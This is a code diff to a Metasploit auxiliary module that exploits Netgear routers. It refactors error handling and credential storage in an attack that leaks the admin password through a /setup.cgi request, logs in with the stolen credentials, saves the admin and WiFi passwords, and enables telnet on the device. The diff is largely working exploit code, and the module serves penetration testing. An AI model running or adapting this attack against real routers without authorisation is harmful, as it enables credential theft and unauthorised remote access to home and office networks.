@@ -62,7 +62,7 @@ class MetasploitModule < Msf::Auxiliary
       return Exploit::CheckCode::Safe('Target does not appear to be a Netgear router!')
     end
 
-    # Retreive model name and firmware version
+    # Retrieve model name and firmware version
     res = send_request_cgi({ 'uri' => '/currentsetting.htm' })
     if res.nil?
       return Exploit::CheckCode::Unknown('Connection timed out.')
@@ -106,21 +106,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    print_status('Confirming target is a Netgear Router...')
-    res = send_request_cgi(
-      'uri' => '/',
-      'method' => 'GET'
-    )
-
-    if res.nil?
-      fail_with(Failure::Unreachable, 'Connection timed out.')
-    end
-
-    unless res.headers['WWW-Authenticate'] =~ /netgear/i
-      fail_with(Failure::NoTarget, 'Target does not appear to be a Netgear router!')
-    end
-
-    print_good('Target is a Netgear router!')
     print_status('Attempting to leak the password of the admin user...')
     res = send_request_cgi(
       'uri' => '/setup.cgi',
@@ -142,16 +127,50 @@ class MetasploitModule < Msf::Auxiliary
     username = leaked_info_array[2]
     password = leaked_info_array[3]
 
-    if html_response.xpath('//div[@id="network_name"]/following-sibling::div[@class="right_div"]').empty? || html_response.xpath('//div[@id="network_name"]/following-sibling::div[@class="right_div"]').length < 2
-      fail_with(Failure::UnexpectedReply, 'Application did not respond with an SSID in its response!')
+    network_names = html_response.xpath('//div[@id="network_name"]/following-sibling::div[@class="right_div"]')
+    if network_names.length < 2
+      print_warning('Application did not respond with an SSID in its response!')
     else
-      wifi_ssid = html_response.xpath('//div[@id="network_name"]/following-sibling::div[@class="right_div"]')[1].text
+      wifi_ssid = network_names[1].text
     end
 
-    if html_response.xpath('//div[@id="network_name_5G"]/following-sibling::div/child::text()').empty?
-      fail_with(Failure::UnexpectedReply, 'Application did not respond with an 5G SSID in its response!')
+    network_names_5g = html_response.xpath('//div[@id="network_name_5G"]/following-sibling::div/child::text()')
+    if network_names_5g.empty?
+      print_warning('Application did not respond with an 5G SSID in its response!')
     else
-      wifi_ssid_5g = html_response.xpath('//div[@id="network_name_5G"]/following-sibling::div/child::text()').text
+      wifi_ssid_5g = network_names_5g.text
+    end
+
+    if wifi_ssid_5g.empty? || wifi_password_5g.empty?
+      print_warning('5G SSID information contained blank strings, skipping saving this info to the database!')
+    else
+      # Create 5G WiFi credential
+      wifi_data_5g = {
+        origin_type: :import,
+        address: datastore['RHOST'],
+        module_fullname: fullname,
+        workspace_id: myworkspace_id,
+        filename: "wifi_#{wifi_ssid_5g}_creds.txt",
+        private_data: wifi_password_5g,
+        private_type: :password
+      }
+      create_credential(wifi_data_5g)
+    end
+
+    if wifi_ssid.empty? || wifi_password.empty?
+      print_warning('SSID information contained blank strings, skipping saving this info to the database!')
+    else
+      # Create regular WiFi credential
+      wifi_data = {
+        origin_type: :import,
+        address: datastore['RHOST'],
+        module_fullname: fullname,
+        workspace_id: myworkspace_id,
+        filename: "wifi_#{wifi_ssid}_creds.txt",
+        private_data: wifi_password,
+        private_type: :password
+      }
+      create_credential(wifi_data)
     end
 
     if username.empty? || password.empty?
@@ -159,14 +178,6 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_good("Can log into target router using username #{username} and password #{password}")
-
-    if wifi_ssid_5g.empty? || wifi_password_5g.empty?
-      print_warning('5G SSID information contained blank strings, information might be invalid!')
-    end
-
-    if wifi_ssid.empty? || wifi_password.empty?
-      print_warning('5G SSID information contained blank strings, information might be invalid!')
-    end
 
     print_status('Attempting to retrieve /top.html to verify we are logged in!')
 
@@ -198,39 +209,15 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     result = res.get_html_document
-    unless result.xpath("//div[@id='firm_version']/text()") # Find all div tags with an "id" attribute named "firm_version" and find its text value.
+    if result.xpath("//div[@id='firm_version']/text()").empty? # Find all div tags with an "id" attribute named "firm_version" and find its text value.
       fail_with(Failure::UnexpectedReply, 'The target router did not respond with a firmware version when /top.html was requested. Are we logged in?')
     end
 
     print_good('Successfully logged into target router using the stolen credentials!')
-    print_status('Attempting to store stolen admin and WiFi credentials for future use...')
+    print_status('Attempting to store the stolen admin credentials for future use...')
 
     # Create HTTP Login Data
     store_valid_credential(user: username, private: password, private_type: :password)
-
-    # Create regular WiFi credential
-    wifi_data = {
-      origin_type: :import,
-      address: datastore['RHOST'],
-      module_fullname: fullname,
-      workspace_id: myworkspace_id,
-      filename: "wifi_#{wifi_ssid}_creds.txt",
-      private_data: wifi_password,
-      private_type: :password
-    }
-    create_credential(wifi_data)
-
-    # Create 5G WiFi credential
-    wifi_data_5g = {
-      origin_type: :import,
-      address: datastore['RHOST'],
-      module_fullname: fullname,
-      workspace_id: myworkspace_id,
-      filename: "wifi_#{wifi_ssid_5g}_creds.txt",
-      private_data: wifi_password_5g,
-      private_type: :password
-    }
-    create_credential(wifi_data_5g)
 
     print_status('Enabling telnet on the target router...')
     res = send_request_cgi(
@@ -246,7 +233,7 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::Unreachable, 'Could not reach the target, something may have happened mid attempt!')
     end
 
-    unless /Debug Enable!/.match(res&.body) # Since this is a one liner response, we don't use XPath searches here and instead resort to a plain regex match.
+    unless res.body.include?('Debug Enable!')
       fail_with(Failure::UnexpectedReply, 'Target did not enable debug mode for some reason!')
     end
     print_good('Telnet enabled on target router!')
